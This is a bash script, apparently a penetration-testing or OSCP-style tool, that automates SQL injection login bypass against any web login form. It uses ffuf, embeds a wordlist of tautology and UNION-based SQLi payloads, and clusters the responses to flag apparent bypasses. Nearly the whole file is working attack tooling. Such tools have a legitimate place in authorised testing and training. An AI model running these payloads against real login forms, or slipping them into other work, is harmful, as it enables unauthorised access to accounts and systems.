#!/usr/bin/env bash
# sqli-login-bypass.sh - generic SQLi login-bypass tester (ffuf-based)
# Works against any login form taking POST username/password-style fields.
# No external wordlist or pre-flight curl needed - wordlist is embedded.

set -uo pipefail

GREEN="\033[0;32m"
YELLOW="\033[0;33m"
RED="\033[0;31m"
CYAN="\033[0;36m"
NC="\033[0m"

clear
echo -e "${CYAN}"
cat << 'BANNER'
  ██████  ██████  ██      ██       ███████  ██████  █████  ███    ██
 ██      ██    ██ ██      ██       ██      ██      ██   ██ ████   ██
  █████  ██    ██ ██      ██       ███████ ██      ███████ ██ ██  ██
      ██ ██ ▄▄ ██ ██      ██            ██ ██      ██   ██ ██  ██ ██
 ██████   ██████  ███████ ██      ███████   ██████ ██   ██ ██   ████
              ▀▀
        SQLi Login Bypass Tester  |  ffuf-based  |  OSCP-safe
BANNER
echo -e "${NC}"

read -rp "url (e.g. http://10.10.10.10/login): " URL
while [ -z "$URL" ]; do
    read -rp "URL is required. url (e.g. http://10.10.10.10/login): " URL
done

read -rp "username field name [username]: " UFIELD
UFIELD="${UFIELD:-username}"

read -rp "password field name [password]: " PFIELD
PFIELD="${PFIELD:-password}"

echo

# ── pre-flight checks ────────────────────────────────────────────────────────

# 1. check URL is reachable
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$URL" 2>/dev/null || echo "000")
if [ "$HTTP_CODE" = "000" ]; then
    echo -e "${RED}[ERROR] URL is not reachable: $URL${NC}"
    exit 1
fi
echo -e "${GREEN}[OK]${NC} Target reachable ($HTTP_CODE): $URL"

# 2. check field names exist in the form HTML (JS-rendered forms may not show here)
FORM_HTML=$(curl -s --max-time 5 "$URL" 2>/dev/null || echo "")
if ! echo "$FORM_HTML" | grep -q "name=[\"']${UFIELD}[\"']"; then
    echo -e "${YELLOW}[WARN] Field '${UFIELD}' not found in page HTML - form may be JS-rendered, proceeding anyway${NC}"
else
    echo -e "${GREEN}[OK]${NC} Username field '${UFIELD}' found in form"
fi
if ! echo "$FORM_HTML" | grep -q "name=[\"']${PFIELD}[\"']"; then
    echo -e "${YELLOW}[WARN] Field '${PFIELD}' not found in page HTML - form may be JS-rendered, proceeding anyway${NC}"
else
    echo -e "${GREEN}[OK]${NC} Password field '${PFIELD}' found in form"
fi

echo
echo -e "[*] Fields: ${UFIELD} / ${PFIELD}"
echo

# ── wordlist ─────────────────────────────────────────────────────────────────

TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

WORDLIST="$TMPDIR/sqli.txt"
cat > "$WORDLIST" <<'WORDLIST_EOF'
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
WORDLIST_EOF

# ── spinner ───────────────────────────────────────────────────────────────────

spinner() {
    local pid=$1
    local label=$2
    local chars='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    local i=0
    while kill -0 "$pid" 2>/dev/null; do
        local c="${chars:$((i % ${#chars})):1}"
        printf "\r${CYAN}[%s]${NC} %s..." "$c" "$label"
        sleep 0.1
        ((i++)) || true
    done
    printf "\r\033[K"
}

# ── analysis ──────────────────────────────────────────────────────────────────

RESULTS_FILE="$TMPDIR/results.txt"
touch "$RESULTS_FILE"

analyze() {
    local jsonfile="$1"
    local label="$2"
    local flagfile="$3"
    local static_field="$4"   # field name that was NOT fuzzed
    local static_value="$5"   # static value used for that field

    python3 - "$jsonfile" "$label" "$flagfile" "$static_field" "$static_value" "$UFIELD" "$PFIELD" "$RESULTS_FILE" << 'PYEOF'
import json, sys
from collections import defaultdict

jsonfile, label, flagfile = sys.argv[1], sys.argv[2], sys.argv[3]
static_field, static_value = sys.argv[4], sys.argv[5]
ufield, pfield, results_file = sys.argv[6], sys.argv[7], sys.argv[8]

with open(jsonfile) as f:
    data = json.load(f)

results = data.get("results", [])
total = len(results)
if total == 0:
    open(flagfile, "w").write("0")
    sys.exit(0)

clusters = defaultdict(list)
for r in results:
    key = (r["status"], r["length"])
    clusters[key].append(r)

sorted_clusters = sorted(clusters.items(), key=lambda kv: -len(kv[1]))

normal_keys = set()
cumulative = 0
for key, items in sorted_clusters:
    if cumulative < total * 0.95:
        normal_keys.add(key)
        cumulative += len(items)
    else:
        break

candidates = [(key, items) for key, items in sorted_clusters if key not in normal_keys]

if not candidates:
    open(flagfile, "w").write("0")
else:
    open(flagfile, "w").write("1")
    with open(results_file, "a") as rf:
        for key, items in sorted(candidates, key=lambda kv: len(kv[1])):
            status, size = key
            first = items[0]
            fuzz_val = first["input"].get("FUZZ", "")

            # build output showing both fields clearly
            if static_field == ufield:
                # fuzz was password field
                line = (f"FOUND - {ufield}={static_value} | {pfield}={fuzz_val} "
                        f"| Status: {status} Size: {size} (matched by {len(items)}/{total} payloads)\n")
            elif static_field == pfield:
                # fuzz was username field
                line = (f"FOUND - {ufield}={fuzz_val} | {pfield}={static_value} "
                        f"| Status: {status} Size: {size} (matched by {len(items)}/{total} payloads)\n")
            else:
                # both fields fuzzed with same payload
                line = (f"FOUND - {ufield}={fuzz_val} | {pfield}={fuzz_val} "
                        f"| Status: {status} Size: {size} (matched by {len(items)}/{total} payloads)\n")
            rf.write(line)
PYEOF
}

run_test() {
    local data="$1"
    local label="$2"
    local outfile="$3"
    local flagfile="$4"
    local static_field="$5"
    local static_value="$6"

    ffuf -w "${WORDLIST}:FUZZ" -X POST \
        -d "$data" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -u "$URL" -s -o "$outfile" -of json \
        > /dev/null 2>&1 &
    local ffuf_pid=$!
    spinner "$ffuf_pid" "$label"
    wait "$ffuf_pid"
    analyze "$outfile" "$label" "$flagfile" "$static_field" "$static_value"
}

# ── run tests ─────────────────────────────────────────────────────────────────

echo -e "[*] Running tests...\n"

run_test "${UFIELD}=FUZZ&${PFIELD}=baselinetest" \
    "Step 1/3: Testing username field" \
    "$TMPDIR/user.json" "$TMPDIR/user.flag" \
    "$PFIELD" "baselinetest"

run_test "${UFIELD}=baselinetest&${PFIELD}=FUZZ" \
    "Step 2/3: Testing password field" \
    "$TMPDIR/pass.json" "$TMPDIR/pass.flag" \
    "$UFIELD" "baselinetest"

run_test "${UFIELD}=FUZZ&${PFIELD}=FUZZ" \
    "Step 3/3: Testing both fields (same payload)" \
    "$TMPDIR/both.json" "$TMPDIR/both.flag" \
    "both" "both"

USER_FOUND=$(cat "$TMPDIR/user.flag" 2>/dev/null || echo 0)
PASS_FOUND=$(cat "$TMPDIR/pass.flag" 2>/dev/null || echo 0)
BOTH_FOUND=$(cat "$TMPDIR/both.flag" 2>/dev/null || echo 0)

if [ "$USER_FOUND" = "0" ] && [ "$PASS_FOUND" = "0" ] && [ "$BOTH_FOUND" = "0" ]; then
    ffuf -w "${WORDLIST}:FUZZUSER" -w "${WORDLIST}:FUZZPASS" -X POST \
        -d "${UFIELD}=FUZZUSER&${PFIELD}=FUZZPASS" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -u "$URL" -s -o "$TMPDIR/combo.json" -of json \
        > /dev/null 2>&1 &
    COMBO_PID=$!
    spinner "$COMBO_PID" "Step 4/4: Full cross-product (last resort, ~5900 requests)"
    wait "$COMBO_PID"
    analyze "$TMPDIR/combo.json" "combination" "$TMPDIR/combo.flag" "both" "both"
fi

# ── results ───────────────────────────────────────────────────────────────────

echo
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}                      RESULTS                         ${NC}"
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo

if [ -s "$RESULTS_FILE" ]; then
    while IFS= read -r line; do
        echo -e "${GREEN}${line}${NC}"
    done < "$RESULTS_FILE"
else
    echo -e "${YELLOW}No SQLi bypass found. Try manual testing or a larger wordlist.${NC}"
fi

echo
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo -e "[!] Always confirm any FOUND line manually with curl before trusting it."
echo -e "[!] If fields showed WARN above, form may be JS-rendered - field names may still be correct."
